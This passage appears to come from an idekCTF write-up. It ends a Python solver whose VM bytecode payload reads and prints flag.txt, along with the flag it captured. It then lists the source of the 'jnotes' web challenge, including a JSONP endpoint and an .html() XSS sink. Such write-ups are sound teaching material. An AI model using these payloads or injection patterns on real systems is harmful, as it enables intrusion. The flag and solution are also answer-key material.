            ch <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            payload <span class="token operator">+=</span> <span class="token string">b"\x01"</span> <span class="token operator">+</span> ch  <span class="token comment"># push(ch)</span>
            payload <span class="token operator">+=</span> <span class="token string">b"\x02\x07"</span>  <span class="token comment"># pop(R7)</span>
            payload <span class="token operator">+=</span> <span class="token string">b"\x07"</span> <span class="token operator">+</span> offset <span class="token operator">+</span> <span class="token string">b"\x07"</span>  <span class="token comment"># store(offset, R7)</span>
    <span class="token keyword">return</span> payload


<span class="token keyword">def</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">b"\x01\x02"</span>  <span class="token comment"># push(2) -> R0, syscall_number = 2 (open)</span>
    payload <span class="token operator">+=</span> <span class="token string">b"\x01\x00"</span>  <span class="token comment"># push(0) -> R1, path_addr = 0x00 (flag.txt)</span>
    payload <span class="token operator">+=</span> <span class="token string">b"\x01\x00"</span>  <span class="token comment"># push(0) -> R2, flags = 0 (read-only)</span>
    payload <span class="token operator">+=</span> <span class="token string">b"\x02\x02\x02\x01\x02\x00"</span>  <span class="token comment"># pop(R2), pop(R1), pop(R0)</span>
    payload <span class="token operator">+=</span> <span class="token string">b"\x08"</span>  <span class="token comment"># syscall</span>
    payload <span class="token operator">+=</span> <span class="token string">b"\x03\x00\x02\x06"</span>  <span class="token comment"># push(R0), pop(R6) -> R6 = fd</span>
    payload <span class="token operator">+=</span> <span class="token string">b"\x08"</span>  <span class="token comment"># syscall</span>
    <span class="token keyword">return</span> payload


<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    size <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> <span class="token string">b"\x01\x00"</span>  <span class="token comment"># push(0) -> R0, syscall_number = 0 (read)</span>
    payload <span class="token operator">+=</span> <span class="token string">b"\x03\x06"</span>  <span class="token comment"># push(R6) -> R1, fd = R6 (result of open syscall)</span>
    payload <span class="token operator">+=</span> <span class="token string">b"\x01\x00"</span>  <span class="token comment"># push(0) -> R2, start_addr = 0x00</span>
    payload <span class="token operator">+=</span> <span class="token string">b"\x01"</span> <span class="token operator">+</span> size  <span class="token comment"># push(size) -> R3</span>
    payload <span class="token operator">+=</span> <span class="token string">b"\x02\x03\x02\x02\x02\x01\x02\x00"</span>  <span class="token comment"># pop(R3), pop(R2), pop(R1), pop(R0)</span>
    payload <span class="token operator">+=</span> <span class="token string">b"\x08"</span>  <span class="token comment"># syscall</span>
    <span class="token keyword">return</span> payload


<span class="token keyword">def</span> <span class="token function">output</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    size <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> <span class="token string">b"\x01\x01"</span>  <span class="token comment"># push(1) -> R0, syscall_number = 1 (write)</span>
    payload <span class="token operator">+=</span> <span class="token string">b"\x01\x01"</span>  <span class="token comment"># push(1) -> R1, fd = 1 (stdout)</span>
    payload <span class="token operator">+=</span> <span class="token string">b"\x01\x00"</span>  <span class="token comment"># push(0) -> R2, start_addr = 0x00</span>
    payload <span class="token operator">+=</span> <span class="token string">b"\x01"</span> <span class="token operator">+</span> size  <span class="token comment"># push(size) -> R3</span>
    payload <span class="token operator">+=</span> <span class="token string">b"\x02\x03\x02\x02\x02\x01\x02\x00"</span>  <span class="token comment"># pop(R3), pop(R2), pop(R1), pop(R0)</span>
    payload <span class="token operator">+=</span> <span class="token string">b"\x08"</span>  <span class="token comment"># syscall</span>
    <span class="token keyword">return</span> payload


size <span class="token operator">=</span> <span class="token number">45</span>
payload <span class="token operator">=</span> store<span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> read<span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">+</span> output<span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># idek{Th15_I$_thE_L@Z13$t_vM_i_h4vE_EvEr_5EEN}Thanks for playing</span>

<span class="token comment"># idek{Th15_I$_thE_L@Z13$t_vM_i_h4vE_EvEr_5EEN}</span>
</code></pre></div><h2 class="x-h1">idekCTF/web/jnotes（赛后）</h2><h3 class="x-h2">题目文件</h3><p class="x-p">展示几个涉及到的关键文件：</p><p class="x-p"><code class="x-inline-highlight">server.js</code>：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">JavaScript</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"crypto"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"cookie-parser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"view engine"</span><span class="token punctuation">,</span> <span class="token string">"ejs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"views"</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"views"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">"public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">get_id</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> notes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">;</span>

<span class="token comment">/* post a note */</span>
app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/api/post"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span>
        noteTitle<span class="token punctuation">,</span>
        noteContent
    <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>noteTitle <span class="token operator">||</span> <span class="token keyword">typeof</span> noteTitle <span class="token operator">!==</span> <span class="token string">"string"</span> <span class="token operator">||</span> <span class="token operator">!</span>noteContent <span class="token operator">||</span> <span class="token keyword">typeof</span> noteContent <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">"invalid note"</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">const</span> id <span class="token operator">=</span> <span class="token function">get_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    notes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> <span class="token punctuation">{</span>
        noteTitle<span class="token punctuation">,</span>
        noteContent
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        id
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/* retrieve a note */</span>
app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/api/view/:note"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">jsonp</span><span class="token punctuation">(</span>notes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>note<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/* retrieve the flag */</span>
app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/api/flag"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>secret <span class="token operator">===</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">SECRET</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token literal-property property">flag</span><span class="token operator">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">FLAG</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">"unauthorized"</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/* view a note */</span>
app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/note/:id"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"notes"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">note</span><span class="token operator">:</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/* index */</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"*path"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span> <span class="token operator">||</span> <span class="token number">1337</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"listening..."</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p"><code class="x-inline-highlight">views/index.ejs</code>：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">HTML</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/style.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.7.1.js<span class="token punctuation">"</span></span>
        <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Post a <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">></span></span>JNote<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noteForm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noteTitle<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noteTitle<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>Content<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noteContent<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noteContent<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>input</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Post<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/index.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
</code></pre></div><p class="x-p"><code class="x-inline-highlight">views/notes.ejs</code>：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">HTML</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 120px, var(--bg-transparent-golden) 120px 144px, transparent 144px, transparent 336px, var(--bg-transparent-golden) 336px 360px, transparent 360px)"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span>
        <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default-src 'none'; script-src 'self' https://code.jquery.com/jquery-3.7.1.js; connect-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/style.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.7.1.js<span class="token punctuation">"</span></span>
        <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/view.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">defer</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/api/view/&lt;%= note %>?callback=showNote<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noteElement<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noteTitle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noteContent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
</code></pre></div><p class="x-p"><code class="x-inline-highlight">public/view.js</code>：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">JavaScript</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">function</span> <span class="token function">showNote</span><span class="token punctuation">(</span><span class="token parameter">note</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    titleElement <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#noteTitle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    contentElement <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#noteContent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    titleElement<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>note<span class="token punctuation">[</span><span class="token string">"noteTitle"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    contentElement<span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>note<span class="token punctuation">[</span><span class="token string">"noteContent"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
